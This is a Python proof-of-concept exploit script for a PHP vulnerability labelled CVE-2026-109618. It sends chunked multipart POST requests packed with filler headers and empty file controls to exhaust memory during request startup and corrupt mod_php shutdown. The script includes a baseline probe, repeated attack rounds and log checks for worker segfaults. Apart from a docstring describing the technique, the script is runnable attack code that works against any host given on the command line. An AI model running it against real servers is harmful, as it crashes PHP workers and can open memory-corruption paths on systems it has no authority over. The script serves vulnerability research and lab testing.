#!/usr/bin/env python3
"""
CVE-2026-109618 trigger (GHSA-w8hw-w9fx-j79w, "RCE via OOM corruption").

Technique (from the official advisory):
  * Chunked multipart POST (no declared Content-Length) passes the initial
    post_max_size check and keeps supplying decoded body data.
  * Each multipart part carries many filler headers; PHP's in-memory
    representation of part headers costs substantially more than their wire
    size. Empty file controls (filename="", empty body) do NOT count toward
    max_file_uploads but still build file metadata arrays.
  * Result: memory_limit is exhausted during request startup while request
    memory is only partially initialized. Vulnerable PHP longjmp()s out,
    and the unconditional mod_php request shutdown then processes invalid
    state (UAF / corrupted shutdown). Patched PHP uses delayed soft OOM at
    the next VM safe point, or a hard _exit() at the higher threshold.

This script only *triggers* the condition. It never asserts RCE.
For education / authorized lab use only.
"""
import argparse
import socket
import sys
import time

BOUNDARY = b"----php2shell918"


def chunk_send(sock: socket.socket, data: bytes) -> None:
    if data:
        sock.sendall(b"%x\r\n" % len(data) + data + b"\r\n")
    else:
        sock.sendall(b"0\r\n\r\n")


def build_part(idx: int, headers_per_part: int, header_size: int) -> bytes:
    """One empty file control (filename="", empty body) with filler headers."""
    pad = b"A" * header_size
    p = BOUNDARY + b"\r\n"
    p += b'Content-Disposition: form-data; name="f[]"; filename=""\r\n'
    for h in range(headers_per_part):
        p += b"X-Flood-%d-%d: " % (idx, h) + pad + b"\r\n"
    p += b"\r\n"
    return p


def send_oom_request(host, port, path, parts, headers_per_part, header_size,
                     timeout=180, progress=False):
    """Send chunked header-flood multipart request. Returns (status, detail)."""
    s = socket.create_connection((host, port), timeout=timeout)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: php2shell-research/109618\r\n"
        "Content-Type: multipart/form-data; boundary=" + BOUNDARY.decode() + "\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    s.sendall(head)
    try:
        # opening boundary is implicit in first part; stream header-flood parts
        for i in range(parts):
            chunk_send(s, build_part(i, headers_per_part, header_size))
        chunk_send(s, BOUNDARY + b"--\r\n")
        chunk_send(s, b"")  # end of chunked body
        resp = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            resp += d
            if len(resp) > 262144:
                break
        if not resp:
            return "NO_RESPONSE", "connection closed without data (worker died or hard _exit)"
        head_part = resp.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
        status = head_part.splitlines()[0] if head_part else "?"
        return "OK", status
    except (ConnectionResetError, BrokenPipeError) as e:
        return "RESET", f"connection reset: {e!r}"
    except socket.timeout:
        return "TIMEOUT", "no response within timeout"
    finally:
        s.close()


def baseline(host, port):
    """Small normal multipart POST - verifies the endpoint actually works."""
    s = socket.create_connection((host, port), timeout=15)
    body = (
        BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="hello"\r\n\r\n'
        b"world\r\n"
        + BOUNDARY + b"--\r\n"
    )
    head = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY[2:].decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s.sendall(head + body)
    resp = b""
    while True:
        d = s.recv(65536)
        if not d:
            break
        resp += d
    s.close()
    first = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    ver = next((l for l in resp.decode("latin1", "replace").splitlines() if l.startswith("PHP ")), "")
    return first, ver


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM trigger")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--parts", type=int, default=3000,
                    help="number of empty-file multipart parts")
    ap.add_argument("--headers-per-part", type=int, default=16)
    ap.add_argument("--header-size", type=int, default=2048)
    ap.add_argument("--rounds", type=int, default=3)
    args = ap.parse_args()

    print(f"[*] baseline check http://{args.host}:{args.port}{args.path}")
    try:
        st, ver = baseline(args.host, args.port)
        print(f"    {st} | {ver}")
    except Exception as e:
        print(f"    baseline FAILED: {e}")
        sys.exit(2)

    wire = args.parts * (args.headers_per_part * (args.header_size + 24) + 120)
    print(f"[*] OOM trigger: {args.rounds} round(s), parts={args.parts}, "
          f"hdr={args.headers_per_part}x{args.header_size}B, ~{wire/1048576:.1f} MB wire / request")

    results = []
    for r in range(1, args.rounds + 1):
        t0 = time.time()
        status, detail = send_oom_request(args.host, args.port, args.path,
                                          args.parts, args.headers_per_part,
                                          args.header_size)
        dt = time.time() - t0
        print(f"    round {r}: {status:12s} {detail}  ({dt:.1f}s)")
        results.append((status, detail))
        time.sleep(0.5)

    print("[*] next: inspect apache/php error logs for worker crashes:")
    print(f"    grep -c 'exit signal Segmentation fault' evidence/logs/*/apache/error.log")
    print(f"    docker logs <container> | grep -i 'OOM\\|Allowed memory size\\|Fatal'")


if __name__ == "__main__":
    main()
